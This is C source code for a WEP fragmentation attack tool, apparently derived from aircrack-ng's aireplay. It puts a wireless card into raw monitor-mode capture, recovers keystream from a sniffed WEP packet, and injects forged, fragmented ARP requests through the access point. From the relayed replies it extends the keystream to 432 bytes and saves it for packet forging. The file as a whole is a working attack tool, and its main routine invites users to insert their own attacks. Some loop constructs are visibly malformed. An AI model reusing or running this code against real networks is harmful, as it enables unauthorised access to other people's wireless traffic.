/*
 * k2wrlz framework for sniffing ieee80211 packets
 * and generating deauth packets and sending raw
 * packets.
 * working on all known rfmontx devices
 * Based on C. Devines aireplay, thx!
 */

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netpacket/packet.h>
#include <linux/if_ether.h>
#include <linux/wireless.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <pthread.h>

#include "pcap.h"
#include "crctable.h"

#define uchar unsigned char

#define ARPHRD_IEEE80211        801
#define ARPHRD_IEEE80211_PRISM  802
#define ARPHRD_IEEE80211_FULL   803

#ifndef ETH_P_80211_RAW
#define ETH_P_80211_RAW 25
#endif

struct devices
{
    int fd_in,  arptype_in;
    int fd_out, arptype_out;
    int fd_rtc;

    int is_wlanng;
    int is_hostap;
    int is_madwifi;
}
dev;

unsigned long nb_pkt_sent;
unsigned char tmpbuf[4096];
char strbuf[512];
char athXraw[] = "athXraw";
uchar *xor;
char mac_p[6] = "\x00\x00\x00\x00\x00\x00";
uchar *arp;

/* wlanng-aware frame sending routing */

int send_packet( void *buf, size_t count )
{
    int ret;

    if( dev.is_wlanng && count >= 24 )
    {
        /* for some reason, wlan-ng requires a special header */

        if( ( ((unsigned char *) buf)[0] & 3 ) != 3 )
        {
            memcpy( tmpbuf, buf, 24 );
            memset( tmpbuf + 24, 0, 22 );

            tmpbuf[30] = ( count - 24 ) & 0xFF;
            tmpbuf[31] = ( count - 24 ) >> 8;

            memcpy( tmpbuf + 46, buf + 24, count - 24 );

            count += 22;
        }
        else
        {
            memcpy( tmpbuf, buf, 30 );
            memset( tmpbuf + 30, 0, 16 );

            tmpbuf[30] = ( count - 30 ) & 0xFF;
            tmpbuf[31] = ( count - 30 ) >> 8;

            memcpy( tmpbuf + 46, buf + 30, count - 30 );

            count += 16;
        }

        buf = tmpbuf;
    }

    if( ( dev.is_wlanng || dev.is_hostap ) &&
        ( ((uchar *) buf)[1] & 3 ) == 2 )
    {
        unsigned char maddr[6];

        /* Prism2 firmware swaps the dmac and smac in FromDS packets */

        memcpy( maddr, buf + 4, 6 );
        memcpy( buf + 4, buf + 16, 6 );
        memcpy( buf + 16, maddr, 6 );
    }

    ret = write( dev.fd_out, buf, count );

    if( ret < 0 )
    {
        if( errno == EAGAIN || errno == EWOULDBLOCK ||
            errno == ENOBUFS )
        {
            usleep( 10000 );
            return( 0 );
        }

        perror( "write failed" );
        return( -1 );
    }

    nb_pkt_sent++;
    return( 0 );
}

/* madwifi-aware frame reading routing */

int read_packet( void *buf, size_t count )
{
    int caplen, n = 0;

    if( ( caplen = read( dev.fd_in, tmpbuf, count ) ) < 0 )
    {
        if( errno == EAGAIN )
            return( 0 );

        perror( "read failed" );
        return( -1 );
    }

    if( dev.is_madwifi )
        caplen -= 4;    /* remove the FCS */

    memset( buf, 0, sizeof( buf ) );

    if( dev.arptype_in == ARPHRD_IEEE80211_PRISM )
    {
        /* skip the prism header */

        if( tmpbuf[7] == 0x40 )
            n = 64;
        else
            n = *(int *)( tmpbuf + 4 );

        if( n < 8 || n >= caplen )
            return( 0 );
    }

    if( dev.arptype_in == ARPHRD_IEEE80211_FULL )
    {
        /* skip the radiotap header */

        n = *(unsigned short *)( tmpbuf + 2 );

        if( n <= 0 || n >= caplen )
            return( 0 );
    }

    caplen -= n;

    memcpy( buf, tmpbuf + n, caplen );

    return( caplen );
}

/* interface initialization routine */

int openraw( char *iface, int fd, int *arptype )
{
    struct ifreq ifr;
    struct packet_mreq mr;
    struct sockaddr_ll sll;

    /* find the interface index */

    memset( &ifr, 0, sizeof( ifr ) );
    strncpy( ifr.ifr_name, iface, sizeof( ifr.ifr_name ) - 1 );

    if( ioctl( fd, SIOCGIFINDEX, &ifr ) < 0 )
    {
        perror( "ioctl(SIOCGIFINDEX) failed" );
        return( 1 );
    }

    /* bind the raw socket to the interface */

    memset( &sll, 0, sizeof( sll ) );
    sll.sll_family   = AF_PACKET;
    sll.sll_ifindex  = ifr.ifr_ifindex;

    if( dev.is_wlanng )
        sll.sll_protocol = htons( ETH_P_80211_RAW );
    else
        sll.sll_protocol = htons( ETH_P_ALL );

    if( bind( fd, (struct sockaddr *) &sll,
              sizeof( sll ) ) < 0 )
    {
        perror( "bind(ETH_P_ALL) failed" );
        return( 1 );
    }

    /* lookup the hardware type */

    if( ioctl( fd, SIOCGIFHWADDR, &ifr ) < 0 )
    {
        perror( "ioctl(SIOCGIFHWADDR) failed" );
        return( 1 );
    }

    if( ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211 &&
        ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211_PRISM &&
        ifr.ifr_hwaddr.sa_family != ARPHRD_IEEE80211_FULL )
    {
        if( ifr.ifr_hwaddr.sa_family == 1 )
            fprintf( stderr, "\nARP linktype is set to 1 (Ethernet) " );
        else
            fprintf( stderr, "\nUnsupported hardware link type %4d ",
                     ifr.ifr_hwaddr.sa_family );

        fprintf( stderr, "- expected ARPHRD_IEEE80211\nor ARPHRD_IEEE8021"
                         "1_PRISM instead.  Make sure RFMON is enabled:\n"
                         "run 'ifconfig %s up; iwconfig %s mode Monitor "
                         "channel <#>'\n\n", iface, iface );
        return( 1 );
    }

    *arptype = ifr.ifr_hwaddr.sa_family;

    /* enable promiscuous mode */

    memset( &mr, 0, sizeof( mr ) );
    mr.mr_ifindex = sll.sll_ifindex;
    mr.mr_type    = PACKET_MR_PROMISC;

    if( setsockopt( fd, SOL_PACKET, PACKET_ADD_MEMBERSHIP,
                    &mr, sizeof( mr ) ) < 0 )
    {
        perror( "setsockopt(PACKET_MR_PROMISC) failed" );
        return( 1 );
    }

    return( 0 );
}

/* Print packet dump to stdout */

void print_packet ( uchar h80211[], int caplen )
{
	int i,j;

	printf( "        Size: %d, FromDS: %d, ToDS: %d",
		caplen, ( h80211[1] & 2 ) >> 1, ( h80211[1] & 1 ) );

	if( ( h80211[0] & 0x0C ) == 8 && ( h80211[1] & 0x40 ) != 0 )
	{
	if( ( h80211[27] & 0x20 ) == 0 )
		printf( " (WEP)" );
	else
		printf( " (WPA)" );
	}

	for( i = 0; i < caplen; i++ )
	{
	if( ( i & 15 ) == 0 )
	{
		if( i == 224 )
		{
		printf( "\n        --- CUT ---" );
		break;
		}

		printf( "\n        0x%04x:  ", i );
	}

	printf( "%02x", h80211[i] );

	if( ( i & 1 ) != 0 )
		printf( " " );

	if( i == caplen - 1 && ( ( i + 1 ) & 15 ) != 0 )
	{
		for( j = ( ( i + 1 ) & 15 ); j < 16; j++ )
		{
		printf( "  " );
		if( ( j & 1 ) != 0 )
			printf( " " );
		}

		printf( " " );

		for( j = 16 - ( ( i + 1 ) & 15 ); j < 16; j++ )
		printf( "%c", ( h80211[i - 15 + j] <  32 ||
				h80211[i - 15 + j] > 126 )
				? '.' : h80211[i - 15 + j] );
	}

	if( i > 0 && ( ( i + 1 ) & 15 ) == 0 )
	{
		printf( " " );

		for( j = 0; j < 16; j++ )
		printf( "%c", ( h80211[i - 15 + j] <  32 ||
				h80211[i - 15 + j] > 127 )
				? '.' : h80211[i - 15 + j] );
	}
	}
	printf("\n");
}

char hex2char (char byte1, char byte2)
{
// Very simple routine to convert hexadecimal input into a byte
	char rv;

	if (byte1 == '0') { rv = 0; }
	if (byte1 == '1') { rv = 16; }
	if (byte1 == '2') { rv = 32; }
	if (byte1 == '3') { rv = 48; }
	if (byte1 == '4') { rv = 64; }
	if (byte1 == '5') { rv = 80; }
	if (byte1 == '6') { rv = 96; }
	if (byte1 == '7') { rv = 112; }
	if (byte1 == '8') { rv = 128; }
	if (byte1 == '9') { rv = 144; }
	if (byte1 == 'A' || byte1 == 'a') { rv = 160; }
	if (byte1 == 'B' || byte1 == 'b') { rv = 176; }
	if (byte1 == 'C' || byte1 == 'c') { rv = 192; }
	if (byte1 == 'D' || byte1 == 'd') { rv = 208; }
	if (byte1 == 'E' || byte1 == 'e') { rv = 224; }
	if (byte1 == 'F' || byte1 == 'f') { rv = 240; }

	if (byte2 == '0') { rv += 0; }
	if (byte2 == '1') { rv += 1; }
	if (byte2 == '2') { rv += 2; }
	if (byte2 == '3') { rv += 3; }
	if (byte2 == '4') { rv += 4; }
	if (byte2 == '5') { rv += 5; }
	if (byte2 == '6') { rv += 6; }
	if (byte2 == '7') { rv += 7; }
	if (byte2 == '8') { rv += 8; }
	if (byte2 == '9') { rv += 9; }
	if (byte2 == 'A' || byte2 == 'a') { rv += 10; }
	if (byte2 == 'B' || byte2 == 'b') { rv += 11; }
	if (byte2 == 'C' || byte2 == 'c') { rv += 12; }
	if (byte2 == 'D' || byte2 == 'd') { rv += 13; }
	if (byte2 == 'E' || byte2 == 'e') { rv += 14; }
	if (byte2 == 'F' || byte2 == 'f') { rv += 15; }

	return rv;
}

char *parse_mac(char *input)
{
// Parsing input MAC adresses like 00:00:11:22:aa:BB or 00001122aAbB

    char tmp[12] = "000000000000";
    int t;

    if (input[2] == ':') {
	memcpy(tmp   , input   , 2);
	memcpy(tmp+2 , input+3 , 2);
	memcpy(tmp+4 , input+6 , 2);
	memcpy(tmp+6 , input+9 , 2);
	memcpy(tmp+8 , input+12 , 2);
	memcpy(tmp+10, input+15 , 2);
    } else {
	memcpy(tmp, input, 12);
    }

    for (t=0; t<6; t++) mac_p[t] = hex2char(tmp[2*t], tmp[2*t+1]);

    return mac_p;
}

uchar *xor_me_baby(uchar *plain, uchar *keystream, int len)
{
    int i=0;

    xor = (uchar*) malloc(len);

    for (i=0; i<len; i++) {
	xor[i] = plain[i] ^ keystream[i];
    }

    return xor;
}

void add_icv(uchar *input, int len)
{
    unsigned long crc = 0xFFFFFFFF;
    int n=0;

    for( n = 28; n < len; n++ )
        crc = crc_tbl[(crc ^ input[n]) & 0xFF] ^ (crc >> 8);

    crc = ~crc;

    input[len]   = (crc      ) & 0xFF;
    input[len+1] = (crc >>  8) & 0xFF;
    input[len+2] = (crc >> 16) & 0xFF;
    input[len+3] = (crc >> 24) & 0xFF;

    return;
}

void send_fragments(uchar *packet, int packet_len, uchar *iv, uchar *keystream, int fragsize)
{
    int t, u;
    int data_size = packet_len - 24;
    uchar frag[30+fragsize];
    int pack_size;

	printf("Packet:\n");
	print_packet(packet, packet_len);

    for (t=0; t+=fragsize; t<data_size) {

    //Copy header
	memcpy(frag, packet, 24);

    //Copy IV + KeyIndex
	memcpy(frag+24, iv, 4);

    //Copy data
	memcpy(frag+28, packet+24+t-fragsize, fragsize);

    //Make ToDS frame
	frag[1] |= 1;
	frag[1] &= 253;

    //Set fragment bit
	if (t< data_size) frag[1] |= 4;
	if (t==data_size) frag[1] &= 251;

    //Fragment number
	frag[22] = 0;
	for (u=t; u-=fragsize; u>0) {
		frag[22] += 1;
	}
 	frag[23] = 0;

    //Calculate packet lenght
	pack_size = 28 + fragsize;

    //Add ICV
	add_icv(frag, pack_size);
	pack_size += 4;

    //Encrypt
	memcpy(frag+28, xor_me_baby(frag+28, keystream, fragsize+4), fragsize+4);

    //Send
	send_packet(frag, pack_size);
	usleep(10);

	if (t>=data_size) break;
    }

}

void save_prga(char *filename, uchar *iv, uchar *prga, int prgalen)
{
    FILE *xorfile;
    xorfile = fopen(filename, "wb");
    fwrite (iv, 1, 4, xorfile);
    fwrite (prga, 1, prgalen, xorfile);
    fclose (xorfile);
}

uchar *make_arp_request(uchar *bssid, uchar *src_mac, uchar *dst_mac, uchar *src_ip, uchar *dst_ip, int size)
{
    arp = (uchar *) malloc(size + 128);

    // 802.11 part
    uchar *header80211 = "\x08\x41\x95\x00";
    memcpy(arp,    header80211, 4);
    memcpy(arp+4,  bssid,       6);
    memcpy(arp+10, src_mac,     6);
    memcpy(arp+16, dst_mac,     6);
    arp[22] = '\x00';
    arp[23] = '\x00';

    // ARP part
    uchar *arp_header = "\xaa\xaa\x03\x00\x00\x00\x08\x06\x00\x01\x08\x00\x06\x04\x00\x01";
    memcpy(arp+24, arp_header, 16);
    memcpy(arp+40, src_mac,     6);
    memcpy(arp+46, src_ip,      4);
    memset(arp+50, '\x00',      6);
    memcpy(arp+56, dst_ip,      4);

    // Insert padding bytes
    memset(arp+60, '\x00', size-60);

    return arp;
}

/* MAIN */

int main( int argc, char *argv[] )
{
    int n;

    if( geteuid() != 0 )
    {
        printf( "This program requires root privileges.\n" );
        return( 1 );
    }


    if( argc < 2 )
    {
        printf( "ieee80211rawframework: Need to know your device!\n");
        return( 1 );
    }

    memset( &dev, 0, sizeof( dev ) );

    dev.fd_rtc = -1;

    dev.fd_in = dev.fd_out = (int) argv[1];

    /* create the RAW sockets */

    if( ( dev.fd_in = socket( PF_PACKET, SOCK_RAW,
                              htons( ETH_P_ALL ) ) ) < 0 )
    {
        perror( "socket(PF_PACKET) failed" );
        if( getuid() != 0 )
            fprintf( stderr, "This program requires root privileges.\n" );
        return( 1 );
    }

    if( ( dev.fd_out = socket( PF_PACKET, SOCK_RAW,
                               htons( ETH_P_ALL ) ) ) < 0 )
    {
        perror( "socket(PF_PACKET) failed" );
        return( 1 );
    }

    /* check if wlan-ng or hostap or r8180 */

    if( strlen( argv[1] ) == 5 &&
        memcmp( argv[1], "wlan", 4 ) == 0 )
    {
        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "wlancfg show %s 2>/dev/null | "
                  "grep p2CnfWEPFlags >/dev/null",
                  argv[1] );

        if( system( strbuf ) == 0 )
            dev.is_wlanng = 1;

        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "iwpriv %s 2>/dev/null | "
                  "grep antsel_rx >/dev/null",
                  argv[1] );

        if( system( strbuf ) == 0 )
            dev.is_hostap = 1;
    }

    /* enable injection on ralink */

    if( memcmp( argv[1], "ra", 2 ) == 0 ||
        memcmp( argv[1], "rausb", 5 ) == 0 )
    {
        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "iwpriv %s rfmontx 1 &>/dev/null",
                  argv[1] );
        system( strbuf );
    }

    /* check if newer athXraw interface available */

    if( strlen( argv[1] ) == 4 &&
        memcmp( argv[1], "ath", 3 ) == 0 )
    {
        memset( strbuf, 0, sizeof( strbuf ) );
        snprintf( strbuf,  sizeof( strbuf ) - 1,
                  "sysctl -w dev.%s.rawdev=1 &>/dev/null",
                  argv[1] );

        if( system( strbuf ) == 0 )
        {
            athXraw[3] = argv[1][3];

            memset( strbuf, 0, sizeof( strbuf ) );
            snprintf( strbuf,  sizeof( strbuf ) - 1,
                      "ifconfig %s up", athXraw );
            system( strbuf );
            argv[1] = athXraw;
        }
    }

    /* drop privileges */

    setuid( getuid() );

    /* open the replay interface */

    dev.is_madwifi = ( memcmp( argv[1], "ath", 3 ) == 0 );

    if( openraw( argv[1], dev.fd_out, &dev.arptype_out ) != 0 )
        return( 1 );

    dev.fd_in = dev.fd_out;
    dev.arptype_in = dev.arptype_out;

    /*
    * running attack functions
    *
    * insert own attacks here!
    */

    attack(argc, argv);

    return( 0 );
}

/* Fragmentation Attack */

int attack( int argc, char *argv[] )
{

    uchar pkts[4096];
    int pktslen = 0;
    uchar *prga;
    uchar iv[4];
    uchar *plain_snap = "\xAA\xAA\x03\x00\x00\x00\x08";
    char mac_c1[6] = "\x00\x00\x00\x00\x00\x00";
    char mac_c2[6] = "\x00\x00\x00\x00\x00\x00";
    char mac_b[6] = "\x00\x00\x00\x00\x00\x00";
    uchar ipsrc[4];
    uchar ipdest[4];
    int wait, wait2;
    int isrelay=0;
    uchar *arp;
    int arplen;
    uchar *aspj = "ASPj rulez and Zero_Chaos is a nice guy, too";	// This has been changed for the release ;)
    uchar ack[14] = "\xd4";

    memset(ack+1, 0, 9);

    if (argc != 8) {
	printf("USAGE: %s <interface> <BSSID> <Client1MAC> <Client2MAC> <SrcIP> <DestIP> <PRGA-Output-Filename>\n", argv[0]);
	return -1;
    }

    memcpy(mac_c1, parse_mac(argv[3]), 6);
    memcpy(mac_c2, parse_mac(argv[4]), 6);
    memcpy(mac_b , parse_mac(argv[2]), 6);
    memcpy(ack+4 , mac_b, 6);

    printf ("Waiting for a data packet...\n");

    new_sniff:
    wait2 = 0;

    while (1) {
	pktslen = read_packet(pkts, 4096);
	if (pkts[0] == '\x08') 
	    if (! memcmp(pkts+10, mac_b, 6)) break;
    }

    printf("Data packet found!\n");
    //print_packet(pkts, pktslen);

    if (!(pkts[1] & 64)) {
	printf("Not WEP, waiting for another...\n");
	goto new_sniff;
    }

    //printf("Ciphertext (first 7 bytes):\n");
    //print_packet(pkts+28, 7);

    prga = xor_me_baby(plain_snap, pkts+28, 7);
    memcpy(iv, pkts+24, 4);

    printf("Keystream (recovered 7 bytes):\n");
    print_packet(prga, 7);

    //Convert IP input to hex
    inet_aton( argv[5], (struct in_addr *) ipsrc );
    inet_aton( argv[6], (struct in_addr *) ipdest );

    resend_frag:

    wait = 0;
    //send_3_byte_fragments(prga, pkts, mac_c, mac_b, ipsrc, ipdest);
    arp = make_arp_request(mac_b, mac_c1, mac_c2, ipsrc, ipdest, 60);
    arplen=60;
    if ((wait2 % 3) == 1) {
	printf("Trying a LLC NULL packet\n");
	memset(arp+24, '\x00', 39);
	arplen=63;
    }
    if ((wait2 % 3) == 2) {
	printf("Trying the special ASPj packet\n");
	memcpy (arp+24, aspj, 42);
	arplen=66;
    }

    printf("Sending fragmented packet\n");
    send_fragments(arp, arplen, iv, prga, 3);
    //Plus an ACK
    send_packet(ack, 10);

    while (1) {
	pktslen = read_packet(pkts, 4096);
	wait++;
	if (pkts[0] == '\x08') //Is data frame
	    if (pkts[1] & 2) { //Is a FromDS packet
		if (! memcmp(mac_c2, pkts+4, 6)) //To our MAC
		    if (! memcmp(mac_c1, pkts+16, 6)) //From our MAC
			if (pktslen < 90) { //Is short enough
			    //This is our relayed packet!
			    printf("Got RELAYED packet!!\n");
			    isrelay = 1;
			    goto sniffed;
			}
		if (! memcmp(mac_c1, pkts+4, 6)) //To our MAC
		    if (pktslen < 90) { //Is short enough
			//This is an answer to our packet!
			printf("Got ANSWER packet!!\n");
			isrelay = 0;
			goto sniffed;
		    }
	    }
	if (wait > 5) {
	    printf("No answer, repeating...\n");
	    wait2++;
	    if (wait2 > 50) {
		printf("Still nothing, trying another packet...\n");
		goto new_sniff;
	    }
	    goto resend_frag;
	}
    }

    sniffed:

    printf("Data packet sniffed:\n");
    print_packet(pkts, pktslen);

    if (pktslen == 68) {
	//Thats the ARP packet!
	printf("Thats our ARP packet!\n");
	arp = make_arp_request(mac_b, mac_c1, mac_c2, ipsrc, ipdest, 60);
    }
    if (pktslen == 71) {
	//Thats the LLC NULL packet!
	printf("Thats our LLC Null packet!\n");
	memset(arp+24, '\x00', 39);
    }
    if (pktslen == 74) {
	//Thats the ASPj packet!
	printf("Thats our ASPj packet!!!!!\n");
	memcpy (arp+24, aspj, 42);
    }

    if (! isrelay) {
	//Building expected cleartext
	uchar ct[4096] = "\xaa\xaa\x03\x00\x00\x00\x08\x06\x00\x01\x08\x00\x06\x04\x00\x02";
			  //Ethernet & ARP header

	//Followed by the senders MAC and IP:
	memcpy(ct+16, pkts+16, 6);
	memcpy(ct+22, ipdest,  4);

	//And our own MAC and IP:
	memcpy(ct+26, mac_c1,   6);
	memcpy(ct+32, ipsrc,   4);

	//Showing expected cleartext
	printf("Expected cleartext:\n");
	print_packet(ct, 36);

	//Calculating
	prga = xor_me_baby(ct, pkts+28, 36);
    } else {
	prga = xor_me_baby(arp+24, pkts+28, 36);
    }

    memcpy(iv, pkts+24, 4);
    printf("Resulting keystream:\n");
    print_packet(prga, 36);
    save_prga(argv[7], iv, prga, 36);

    printf("Trying to get 408 bytes of a keystream\n");

    wait2 = 0;

    resend_frag2:

    wait = 0;

    arp = make_arp_request(mac_b, mac_c1, mac_c2, ipsrc, ipdest, 408);
    arplen = 408;
    if ((wait2 % 3) == 1) {
	printf("Trying a LLC NULL packet\n");
	memset(arp+24, '\x00', 416);
	arplen += 32;
    }

    send_fragments(arp, arplen, iv, prga, 32);

    while (1) {
	pktslen = read_packet(pkts, 4096);
	wait++;
	if (pkts[0] == '\x08') //Is data frame
	    if (pkts[1] & 2) //Is a FromDS packet
		if (! memcmp(mac_c2, pkts+4, 6)) //To our MAC
		    if (! memcmp(mac_c1, pkts+16, 6)) //From our MAC
			if (pktslen > 400) { //Is big enough
			    //This is our relayed packet!
			    printf("Got RELAYED packet!!\n");
			    isrelay = 1;
			    break;
			}

	if (wait > 5) {
	    printf("No answer, repeating...\n");
	    wait2++;
	    if (wait2 > 50) {
		printf("Still nothing, trying another packet...\n");
		goto new_sniff;
	    }
	    goto resend_frag2;
	}
    }

    if (pktslen == 416) {
	//Thats the ARP packet!
	printf("Thats our ARP packet!\n");
	arp = make_arp_request(mac_b, mac_c1, mac_c2, ipsrc, ipdest, 408);
    }
    if (pktslen == 448) {
	//Thats the LLC NULL packet!
	printf("Thats our LLC Null packet!\n");
	memset(arp+24, '\x00', 416);
    }

    prga = xor_me_baby(arp+24, pkts+28, 408);

    memcpy(iv, pkts+24, 4);
    printf("Resulting keystream:\n");
    print_packet(prga, 432);
    save_prga(argv[7], iv, prga, 432);

    printf("Now you can build a packet with packetforge-ng out of that keystream\n");

    // DEBUG & TESTING


/*
    resend_frag30:

    wait = 0;
    send_30_byte_fragments(prga, pkts, mac_c, mac_b, ipsrc, ipdest);

    while (1) {
	pktslen = read_packet(pkts, 4096);
	wait++;
	if (pkts[0] == '\x08') //Is data frame
	    if (! memcmp(mac_c, pkts+4, 6)) //Has our MAC
		if (pktslen < 90) //Is short enough to be an ARP
		    break;
	if (wait > 10) {
	    printf("No answer, repeating...\n");
	    goto resend_frag30;
	}
    }

    printf("Data packet sniffed:\n");
    print_packet(pkts, pktslen);*/

}